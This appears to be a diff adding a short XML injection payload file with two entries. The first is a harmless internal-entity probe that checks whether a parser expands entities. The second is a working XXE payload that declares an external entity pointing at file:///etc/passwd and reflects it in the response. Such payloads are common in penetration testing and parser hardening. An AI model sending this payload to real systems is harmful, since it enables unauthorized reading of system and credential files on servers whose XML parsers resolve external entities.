@@ -1,0 +1,11 @@
+<!--Payload1-->
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+<!--Payload2-->
+ <?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
